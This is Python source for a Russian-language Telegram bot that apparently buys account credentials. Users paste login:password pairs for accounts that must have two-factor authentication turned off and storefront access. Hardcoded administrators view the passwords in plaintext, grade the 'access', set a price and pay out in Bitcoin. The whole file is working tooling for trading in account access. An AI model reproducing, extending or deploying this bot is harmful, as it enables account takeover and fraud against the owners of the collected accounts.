from cgitb import text
from email import message
from multiprocessing.sharedctypes import Value
from xmlrpc.client import Boolean
from telebot import *
import configyre
from db import *
import time



client = TeleBot(configyre.config['token'])


    
@client.message_handler(commands = ['start'])
def get_start(message):
    if message.chat.id == '-1001789585338':
        pass
    else:
        text = """-Как это работает? 

    Присылаете аккаунт в бот, подходящий под критерии которые описаны ниже! он автоматически проверяет ваш аккаунт и выставит  оценку /5, и выплату. После выработке выплату получите на любой кошелёк BTC все вместе занимает обычно 24ч если нет очереди 12ч

    ✅На аккаунте должна быть выключена двухфакторная аутентификация!

    ✅Принимаются только аккаунты с возможностью доступа к витрине. Пожалуйста, проверяйте аккаунт перед загрузкой!

    ✅Проверка может занять некоторое время, в зависимости от текущей нагрузки, будьте терпеливы!

    За любой доступ вы получаете от 1000.00 до 50.000 ₽
    Бот автоматически расчитает стоимость доступа.

    ✅В шапке аккаунта не должно быть отрицательных отзывов!
    ✅Установлено ограничение на количество аккаунтов в минуту!
    ✅Установлены ограничения на доступ!
    ✅Мы не несём ответственность за бан все сделки на ваш страх и риск!"""
        markyp= types.ReplyKeyboardMarkup(resize_keyboard = True)
        item_finance = types.KeyboardButton('🦸🏼Профиль')
        item_load = types.KeyboardButton('⬆️ Загрузить аккаунт')
        item_pref = types.KeyboardButton('⚙️ Настройки')
        item_support = types.KeyboardButton('🌐 Поддержка')
        markyp.row(item_finance,item_load)
        markyp.row(item_pref,item_support)
        client.send_message(message.from_user.id, text,reply_markup = markyp)


@client.message_handler(commands=['removebutton'])
def remove(message):
    a = types.ReplyKeyboardRemove()
    client.send_message(message.chat.id, 'Кнопки удалены', reply_markup=a)


#админская панель
@client.message_handler(commands=['admin'])
def get_admin(message):

    if message.chat.id == 1239134441 or message.chat.id == 5086283097:
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        item_get_user = types.KeyboardButton(text = 'Посмотреть новые поступления')
        item_treatment = types.KeyboardButton(text = 'Аккаунты в обработке')
        markup.row(item_get_user)
        markup.row(item_treatment)
        client.send_message(message.chat.id,'😎 Добро пожаловать Администратор',reply_markup = markup)
        client.register_next_step_handler(message,text_info)
        


# ответки на главную панель
@client.message_handler(content_types='text')
def text_info(message):
    if message.text == '🦸🏼Профиль':
        id = message.chat.id
            
        if get_money(id) == False:
            tex = f"""👨‍💻Профиль: 
└ 💼Выплачена средств: 0RUB
     └ 📝0 сделок."""

            markup_inline = types.InlineKeyboardMarkup()
            item_myorders = types.InlineKeyboardButton(text = '📝Выполненые заказы', callback_data = 'myorders')
            item_connect = types.InlineKeyboardButton(text = '🖥 Резервная связь', callback_data = 'connect')
            item_notes = types.InlineKeyboardButton(text = 'Проверь свои заметки',url= 'https://t.me/noteshdrbot', callback_data = 'notes')
            item_chat = types.InlineKeyboardButton(text = '💬 Чат| Русских писателей.',url= 'https://t.me/+567zJzBTYC9mNjAy', callback_data = 'notes')
            markup_inline.row(item_myorders)
            markup_inline.row(item_connect)
            markup_inline.row(item_notes)
            markup_inline.row(item_chat)
            client.send_message(message.chat.id,tex,reply_markup = markup_inline)
        else:
            money,purchases = get_money(id)
            tex = f"""👨‍💻Профиль: 
└ 💼Выплачена средств: {money} RUB
     └ 📝{purchases} сделок."""

            markup_inline = types.InlineKeyboardMarkup()
            item_myorders = types.InlineKeyboardButton(text = '📝Выполненые заказы', callback_data = 'myorders')
            item_connect = types.InlineKeyboardButton(text = '🖥 Резервная связь', callback_data = 'connect')
            item_notes = types.InlineKeyboardButton(text = 'Проверь свои заметки',url= 'https://t.me/noteshdrbot', callback_data = 'notes')
            item_chat = types.InlineKeyboardButton(text = '💬 Чат| Русских писателей.',url= 'https://t.me/+567zJzBTYC9mNjAy', callback_data = 'notes')
            markup_inline.row(item_myorders)
            markup_inline.row(item_connect)
            markup_inline.row(item_notes)
            markup_inline.row(item_chat)
            client.send_message(message.chat.id,tex,reply_markup = markup_inline)

    elif message.text == '⬆️ Загрузить аккаунт':
        markup = types.ReplyKeyboardMarkup(resize_keyboard = True)
        item_back = types.KeyboardButton(text='❌ Отмена')
        markup.row(item_back)
        tex = '''Введите аккаунт в формате login:password
Принимаются только аккаунты с доступом.
Выплаты производятся после проверки аккаунта ботом.

⌛️ Проверка может занять некоторое время, будьте терпеливы'''
        client.send_message(message.chat.id,tex,reply_markup=markup)
        client.register_next_step_handler(message,get_account)

    elif message.text == '⚙️ Настройки':
        id = message.chat.id
        if get_nickname(id) == False:

            tex = 'Выплаты будут совершаться на BTC_Wallet:НЕ ЗАДАН'
            markup = types.InlineKeyboardMarkup()
            item_addnick = types.InlineKeyboardButton( text = 'Изменить BTC_Wallet', callback_data = 'addnick')
            markup.row(item_addnick)
            client.send_message(message.chat.id,tex,reply_markup = markup)
        else:
            btc= get_nickname(id)
            tex = f'Выплаты будут совершаться на BTC_Wallet:{btc}'
            markup = types.InlineKeyboardMarkup()
            item_addnick = types.InlineKeyboardButton( text = 'Изменить BTC_Wallet', callback_data = 'addnick')
            markup.row(item_addnick)
            client.send_message(message.chat.id,tex,reply_markup = markup)

    elif message.text == '🌐 Поддержка':
        markup = types.InlineKeyboardMarkup()
        item_support = types.InlineKeyboardButton(text = '🌐 Служба поддержки', callback_data = 'support')
        item_FAQ = types.InlineKeyboardButton(text = '❓ FAQ', callback_data = 'FAQ')
        markup.row(item_support)
        markup.row(item_FAQ)
        client.send_message(message.chat.id,'🌐Поддержка', reply_markup = markup)

    elif message.text == 'Аккаунты в обработке':

        if len(get_treatment()) == 0:
            client.send_message(message.chat.id,'Данные аккаунты отсутсвуют')
        else:

            markup = types.InlineKeyboardMarkup()
            
            dict_data = get_treatment()
            for key,value in dict_data.items():
                login = key
                password = value
                item = types.InlineKeyboardButton(f'{login}|{password}',callback_data=f'{login}')
                markup.row(item)
            client.send_message(message.chat.id,'Аккаунты в обработке:',reply_markup=markup)

    elif message.text == 'Посмотреть новые поступления':

        if get_user() == False:
            client.send_message(message.chat.id,'Новых поступлений нет.')
        else:
            id,login,password = get_user()
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
            item_accept = types.KeyboardButton(text = '✅ Принять')
            item_reject = types.KeyboardButton(text = '❌ Отклонить')
            markup.row(item_accept,item_reject)
            client.send_message(message.chat.id, f'Логин:{login}||Пароль:{password}',reply_markup=markup)

    elif message.text == '✅ Принять':
        a = types.ReplyKeyboardRemove()
        client.send_message(message.chat.id, 'Введите цену',reply_markup=a)
        
        client.register_next_step_handler(message, getPrice)

    elif message.text == '❌ Отклонить':
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        item_finalize = types.KeyboardButton(text='🆘 Доработать!')
        item_littleasses = types.KeyboardButton(text='🔓 Мало доступа!')
        item_franshise = types.KeyboardButton(text='🤝 Франшиза от 3 магазинов!')
        item_akk = types.KeyboardButton(text='🔧 Невалидный аккаунт!')
        item_ban = types.KeyboardButton(text='🤬 Бан!')
        item_2fa= types.KeyboardButton(text='📟 На аккаунте установлен 2fa!')
        markup.row(item_finalize,item_littleasses,item_franshise)
        markup.row(item_akk,item_ban,item_2fa)
        delete()
        client.send_message(message.chat.id,'Причина:',reply_markup = markup)
        client.register_next_step_handler(message,send_user_ban)
    elif message.text == 'Принять аккаунты в обработке':
        if send_assept() == False:
            client.send_message(message.chat.id,'Акаунты в обработке не найдены')
        else:
            login,password,asses,price = send_assept()
            name = get_name_after(login)
            if get_purchases1(login) == False:
                text12 = f'''
💥Ак На обработке💥

🦸🏼Профиль: {name}
📝0 сделок. 
🔓Доступ: {asses}/5 
💰Возможная выплата составит: {price} RUB'''
            else:
                pur = get_purchases1(login)
                text12 = f'''
💥Ак На обработке💥

🦸🏼Профиль: {name}
📝{pur} сделок. 
🔓Доступ: {asses}/5 
💰Возможная выплата составит: {price} RUB'''
            
            
            client.send_message(message.chat.id,f'LOGIN:`{login}`\n PASSWORD`{password}`',parse_mode='MarkDown')
            client.send_message(message.chat.id,text12)
            client.send_message(message.chat.id,'Введите цену')
            client.register_next_step_handler(message,send_users)


    else:
        client.send_message(message.from_user.id, 'Для получения информации используйте /start')


def send_user_ban(message):

    mes = message.text

    if get_user() == False:
        client.send_message(message.chat.id,'Сообщение не отправлено')
    else:
        id,login,password = get_user()
        delete()
        client.send_message(id,f'{mes}')
        client.send_message(message.chat.id,'Отправлено')
        if message.chat.id == 1239134441 or message.chat.id == 5086283097:
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
            item_get_user = types.KeyboardButton(text = 'Посмотреть новые поступления')
            item_treatment = types.KeyboardButton(text = 'Аккаунты в обработке')
            markup.row(item_get_user)
            markup.row(item_treatment)
            client.send_message(message.chat.id,'😎 Продолжаем',reply_markup = markup)
            client.register_next_step_handler(message,text_info)



def getPrice(message):

    global mes1

    mes1 = message.text
    try:
        int(mes1) == True
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        item_0 = types.KeyboardButton(text = '0')
        item_1 = types.KeyboardButton(text = '1')
        item_2 = types.KeyboardButton(text = '2')
        item_3 = types.KeyboardButton(text = '3')
        item_4 = types.KeyboardButton(text = '4')
        item_5 = types.KeyboardButton(text = '5')
        markup.row(item_0,item_1,item_2,item_3,item_4,item_5)
        client.send_message(message.chat.id,'Введите уровень доступа',reply_markup = markup)
        client.register_next_step_handler(message,asses_level)

    except:
        if message.chat.id == 1239134441 or message.chat.id == 5086283097:
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
            item_get_user = types.KeyboardButton(text = 'Посмотреть новые поступления')
            item_treatment = types.KeyboardButton(text = 'Аккаунты в обработке')
            markup.row(item_get_user)
            markup.row(item_treatment)
            client.send_message(message.chat.id,'😎Повторите попытку',reply_markup = markup)
            client.register_next_step_handler(message,text_info)


def get_nick(message):
    name = message.text
    id = message.chat.id
    send_nick(id,name)
    client.send_message(message.chat.id,'BTC_Wallet обновлен')



def get_account(message):


    if message.text == '❌ Отмена':
        markyp= types.ReplyKeyboardMarkup(resize_keyboard = True)
        item_finance = types.KeyboardButton('🦸🏼Профиль')
        item_load = types.KeyboardButton('⬆️ Загрузить аккаунт')
        item_pref = types.KeyboardButton('⚙️ Настройки')
        item_support = types.KeyboardButton('🌐 Поддержка')
        markyp.row(item_finance,item_load)
        markyp.row(item_pref,item_support)
        client.send_message(message.chat.id, 'Вы возращены в главное меню!',reply_markup = markyp)

    elif ':' in message.text:
        login = message.text.split(':')[0]
        password = message.text.split(':')[1]
        id = message.chat.id
        firs_name = message.from_user.first_name
        if get_akk(id,login,password,firs_name) == False:
            markyp= types.ReplyKeyboardMarkup(resize_keyboard = True)
            item_finance = types.KeyboardButton('🦸🏼Профиль')
            item_load = types.KeyboardButton('⬆️ Загрузить аккаунт')
            item_pref = types.KeyboardButton('⚙️ Настройки')
            item_support = types.KeyboardButton('🌐 Поддержка')
            markyp.row(item_finance,item_load)
            markyp.row(item_pref,item_support)
            client.send_message(message.chat.id,'Такой аккаунт уже существует',reply_markup=markyp)
        else:
        
            markyp= types.ReplyKeyboardMarkup(resize_keyboard = True)
            item_finance = types.KeyboardButton('🦸🏼Профиль')
            item_load = types.KeyboardButton('⬆️ Загрузить аккаунт')
            item_pref = types.KeyboardButton('⚙️ Настройки')
            item_support = types.KeyboardButton('🌐 Поддержка')
            markyp.row(item_finance,item_load)
            markyp.row(item_pref,item_support)
            client.send_message(5086283097,'Новое поступление аккаунтов')
            client.send_message(message.chat.id, 'Операция проведена успешно!',reply_markup = markyp)

    else:
        markyp= types.ReplyKeyboardMarkup(resize_keyboard = True)
        item_finance = types.KeyboardButton('🦸🏼Профиль')
        item_load = types.KeyboardButton('⬆️ Загрузить аккаунт')
        item_pref = types.KeyboardButton('⚙️ Настройки')
        item_support = types.KeyboardButton('🌐 Поддержка')
        markyp.row(item_finance,item_load)
        markyp.row(item_pref,item_support)
        client.send_message(message.chat.id, 'Вы ввели неправильный адрес, попробуйте ещё раз.',reply_markup = markyp)


def asses_level(message):
    asses = message.text
    name = get_name()
    if get_user() == False:
        client.send_message(message.chat.id,'Аккаунт не обнаружен')
    else:
        
        id,login,password = get_user()
        if get_purchases(id) == False:
            text12 = f'''
💥Ак На обработке💥

🦸🏼Профиль: {name}
📝0 сделок. 
🔓Доступ: {asses}/5 
💰Возможная выплата составит: {mes1} RUB'''
        else:
            pur = get_purchases(id)
            text12 = f'''
💥Ак На обработке💥

🦸🏼Профиль: {name}
📝{pur} сделок. 
🔓Доступ: {asses}/5 
💰Возможная выплата составит: {mes1} RUB'''
        client.send_message(id,f'{text12}')
        get_price_asses(mes1,asses,login,id)
        client.send_message(message.chat.id,'Решение отправлено пользователю')
    
    if message.chat.id == 1239134441 or message.chat.id == 5086283097:
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        item_get_user = types.KeyboardButton(text = 'Посмотреть новые поступления')
        item_treatment = types.KeyboardButton(text = 'Аккаунты в обработке')
        markup.row(item_get_user)
        markup.row(item_treatment)
        
        client.send_message(message.chat.id,'😎 Продолжаем',reply_markup = markup)
        client.register_next_step_handler(message,text_info)
    

def send_users(message):
    mes = message.text
    try:
        int(mes) == True
        id,asses,login = get_treat()
        name = get_name_after(login)
        text21 = f'''✨Сделка завершена✨
        
    🦸🏼Профиль: {name}
    🔓Доступ: {asses}/5 
    💰Выплата составит: {mes} RUB'''
        if get_purchases(id) == False:
            text12 = f'''
    💥Ак Готов💥

    🦸🏼Профиль: {name}
    📝0 сделок. 
    🔓Доступ: {asses}/5 
    💰Выплата составит: {mes} RUB'''

        else:
            pur = get_purchases(id)
            text12 = f'''
    💥Ак Готов💥

    🦸🏼Профиль: {name}
    📝{pur} сделок. 
    🔓Доступ: {asses}/5 
    💰Выплата составит: {mes} RUB'''
        

        client.send_message(message.chat.id,'Операция завершена')
        client.send_message(-1001789585338,text21)
        client.send_message(id,text12)
        

        if message.chat.id == 1239134441 or message.chat.id == 5086283097:
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
            item_get_user = types.KeyboardButton(text = 'Посмотреть новые поступления')
            item_treatment = types.KeyboardButton(text = 'Аккаунты в обработке')
            item_ok = types.KeyboardButton(text = 'Принять аккаунты в обработке')
            markup.row(item_get_user)
            markup.row(item_treatment)
            markup.row(item_ok)
            client.send_message(message.chat.id,'😎 Продолжаем',reply_markup = markup)
            client.register_next_step_handler(message,text_info)

    except:
         if message.chat.id == 1239134441 or message.chat.id == 5086283097:
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
            item_get_user = types.KeyboardButton(text = 'Посмотреть новые поступления')
            item_treatment = types.KeyboardButton(text = 'Аккаунты в обработке')
            markup.row(item_get_user)
            markup.row(item_treatment)
            client.send_message(message.chat.id,'😎Повторите попытку',reply_markup = markup)
            client.register_next_step_handler(message,text_info)


def change_price_asses(message):

    if message.text == '💸Изменить Цену':

        client.send_message(message.chat.id,'Введите цену💸')
        client.register_next_step_handler(message,get_user_price)


    elif message.text == '❌Отказ':
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        item_finalize = types.KeyboardButton(text='🆘 Доработать!')
        item_littleasses = types.KeyboardButton(text='🔓 Мало доступа!')
        item_franshise = types.KeyboardButton(text='🤝 Франшиза от 3 магазинов!')
        item_akk = types.KeyboardButton(text='🔧 Невалидный аккаунт!')
        item_ban = types.KeyboardButton(text='🤬 Бан!')
        item_2fa= types.KeyboardButton(text='📟 На аккаунте установлен 2fa!')
        markup.row(item_finalize,item_littleasses,item_franshise)
        markup.row(item_akk,item_ban,item_2fa)
        client.send_message(message.chat.id,'Причина:',reply_markup = markup)
        client.register_next_step_handler(message,send_user_ban1)
    elif message.text == '✅ Принять':
        log = login_1
        id,price,asses = get_user_id(log)
        btc = get_btc_wallet(id)
        name = get_name_after(login_1)

        text21 = f'''✨Сделка завершена✨
        
🦸🏼Профиль: {name}
🔓Доступ: {asses}/5 
💰Выплата составит: {price} RUB'''
        if get_purchases(id) == False:
            text12 = f'''💥Ак Готов💥

🦸🏼Профиль: {name}
📝1 сделок. 
🔓Доступ: {asses}/5 
💰Выплата составит: {price} RUB
✅Поступает после 2 подтверждений btc.'''
        else:
            pur = get_purchases(id)
            text12 = f'''💥Ак Готов💥

🦸🏼Профиль: {name}
📝{pur} сделок. 
🔓Доступ: {asses}/5 
💰Выплата составит: {price} RUB
✅Поступает после 2 подтверждений btc.'''
        client.send_message(id,text12)
        client.send_message(-1001789585338,text21)

        if message.chat.id == 1239134441 or message.chat.id == 5086283097:
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
            item_get_user = types.KeyboardButton(text = 'Посмотреть новые поступления')
            item_treatment = types.KeyboardButton(text = 'Аккаунты в обработке')
            item_ok = types.KeyboardButton(text = 'Принять аккаунты в обработке')
            markup.row(item_get_user)
            markup.row(item_treatment)
            markup.row(item_ok)
            client.send_message(message.chat.id,f'Аккаунт принят.BTC_WALLET: `{btc}`',reply_markup = markup)
            client.register_next_step_handler(message,text_info)
       
    elif message.text == 'BTC_WALLET пользователя':
        log = login_1
        id = get_user_id_btc(log)
        btc = get_btc_wallet(id)
        client.send_message(message.chat.id,f'`{btc}`',parse_mode = 'MarkDown')
        if message.chat.id == 1239134441 or message.chat.id == 5086283097:
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
            item_get_user = types.KeyboardButton(text = 'Посмотреть новые поступления')
            item_treatment = types.KeyboardButton(text = 'Аккаунты в обработке')
            item_ok = types.KeyboardButton(text = 'Принять аккаунты в обработке')
            markup.row(item_get_user)
            markup.row(item_treatment)
            markup.row(item_ok)
            client.send_message(message.chat.id,'Возращение на главное меню',reply_markup = markup)
            client.register_next_step_handler(message,text_info)

    else:
        client.send_message(message.chat.id,'Нет такого ответа')
        if message.chat.id == 1239134441 or message.chat.id == 5086283097:
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
            item_get_user = types.KeyboardButton(text = 'Посмотреть новые поступления')
            item_treatment = types.KeyboardButton(text = 'Аккаунты в обработке')
            item_ok = types.KeyboardButton(text = 'Принять аккаунты в обработке')
            markup.row(item_get_user)
            markup.row(item_treatment)
            markup.row(item_ok)
            client.send_message(message.chat.id,'😎 Продолжаем',reply_markup = markup)
            client.register_next_step_handler(message,text_info)

def send_user_ban1(message):
    mes = message.text
    log = login_1
    if get_status(log) == False:
        client.send_message(message.chat.id,'Сообщение не отправлено')
    else:
        id = get_status(log)
        delete1(log)
        client.send_message(id,f'{mes}')
        client.send_message(message.chat.id,'Аккаунт удален из бд')
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        item_get_user = types.KeyboardButton(text = 'Посмотреть новые поступления')
        item_treatment = types.KeyboardButton(text = 'Аккаунты в обработке')
        item_ok = types.KeyboardButton(text = 'Принять аккаунты в обработке')
        markup.row(item_get_user)
        markup.row(item_treatment)
        markup.row(item_ok)
        client.send_message(message.chat.id,'😎 Продолжаем',reply_markup = markup)


def get_user_price(message):
        mes = message.text
        try:
            int(mes) == True
            login = login_1
            get_user1_price1(login,mes)
            client.send_message(message.chat.id,'Цена изменена')
            if message.chat.id == 1239134441 or message.chat.id == 5086283097:
                markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
                item_get_user = types.KeyboardButton(text = 'Посмотреть новые поступления')
                item_treatment = types.KeyboardButton(text = 'Аккаунты в обработке')
                markup.row(item_get_user)
                markup.row(item_treatment)
                client.send_message(message.chat.id,'😎 Продолжаем',reply_markup = markup)
                client.register_next_step_handler(message,text_info)
        except:
            if message.chat.id == 1239134441 or message.chat.id == 5086283097:
                markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
                item_get_user = types.KeyboardButton(text = 'Посмотреть новые поступления')
                item_treatment = types.KeyboardButton(text = 'Аккаунты в обработке')
                markup.row(item_get_user)
                markup.row(item_treatment)
                client.send_message(message.chat.id,'😎 Повторите попытку',reply_markup = markup)

@client.callback_query_handler(func= lambda call: True)
def answer(call):





    
    if call.data == 'myorders':
        id = call.message.chat.id
        purchases,money = get_pur(id)
        tex = f'''У вас {purchases} выполненых заказов
Заработано: {money} RUB
'''     
        if len(get_treatment1()) == 0:
            client.send_message(call.message.chat.id,tex)
        else:
            markup = types.InlineKeyboardMarkup()
            
            dict_data1 = get_treatment1()
            for key,value in dict_data1.items():
                login = key
                password = value
                ass = login+password
                item = types.InlineKeyboardButton(f'{login}|{password}',callback_data=f'{ass}')
                markup.row(item)
            client.send_message(call.message.chat.id,tex,reply_markup=markup)
        
        

    elif call.data == 'support':
        tex = '''📝 Написать в поддержку 

По всем вопросам, предложениям и багам: @in_touch_prog
-При обращении с проблемой прикрепляйте скриншот из бота.'''
        client.send_message(call.message.chat.id, tex)

    elif call.data == 'connect':
        tex = '🪐 По всем вопросам обращаться @GogaWork'
        client.send_message(call.message.chat.id, tex)

    elif call.data == 'addnick':
        client.send_message(call.message.chat.id, '🥸 Введите Btc_Wallet')
        client.register_next_step_handler(call.message,get_nick)
    elif call.data == 'FAQ':
        tex = '''-Как это работает? 

Присылаете аккаунт в бот, подходящий под критерии которые описаны ниже! он автоматически проверяет ваш аккаунт и выставит  оценку /5, и выплату. После выработке выплату получите на любой кошелёк BTC все вместе занимает обычно 24ч если нет очереди 12ч

✅На аккаунте должна быть выключена двухфакторная аутентификация!

✅Принимаются только аккаунты с возможностью доступа к витрине. Пожалуйста, проверяйте аккаунт перед загрузкой!

✅Проверка может занять некоторое время, в зависимости от текущей нагрузки, будьте терпеливы!

За любой доступ вы получаете от 1000.00 до 50.000 ₽
Бот автоматически расчитает стоимость доступа.

✅В шапке аккаунта не должно быть отрицательных отзывов!
✅Установлено ограничение на количество аккаунтов в минуту!
✅Установлены ограничения на доступ!
✅Мы не несём ответственность за бан все сделки на ваш страх и риск!'''
        client.send_message(call.message.chat.id, tex)

    dict_data = get_treatment()
    global login_1
    for key,value in dict_data.items():
        login_1 = key
        password = value
        if call.data == f'{login_1}':
            asses,price = get_user_assess_price1(login_1)
            name = get_name_after(login_1)
            if get_purchases1(login_1) == False:
                text12 = f'''
💥Ак На обработке💥

🦸🏼Профиль: {name}
📝0 сделок. 
🔓Доступ: {asses}/5 
💰Возможная выплата составит: {price} RUB'''
            else:
                pur = get_purchases1(login_1)
                text12 = f'''
💥Ак На обработке💥

🦸🏼Профиль: {name}
📝{pur} сделок. 
🔓Доступ: {asses}/5 
💰Возможная выплата составит: {price} RUB'''
            
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
            item_yes = types.KeyboardButton(text = '✅ Принять')
            item_btc = types.KeyboardButton(text = 'BTC_WALLET пользователя')
            itemchange_price = types.KeyboardButton(text = '💸Изменить Цену')
            item_no = types.KeyboardButton(text = '❌Отказ')
            markup.row(item_yes,item_no)
            markup.row(itemchange_price,item_btc)
            client.send_message(call.message.chat.id,text=f'LOGIN: `{login_1}`\n PASSWORD: `{password}`',parse_mode='MarkDown')
            client.send_message(call.message.chat.id,f'{text12}',reply_markup=markup)
            client.register_next_step_handler(call.message,change_price_asses)

    dict1 = get_treatment1()
    for key,value in dict1.items():
                login = key
                password = value
                ass = login+password
                if call.data == f'{ass}':
                    price2 = get_user_price2(login)
                    client.send_message(call.message.chat.id,f'💸Аккаунт оценён в {price2} RUB')


while True:
    try:
        client.polling(none_stop=True)

    except Exception as e:
        file = open('bag.txt', 'a+')
        bag = f'{e}'
        file.write('\n'+bag)
        file.close()
        time.sleep(15)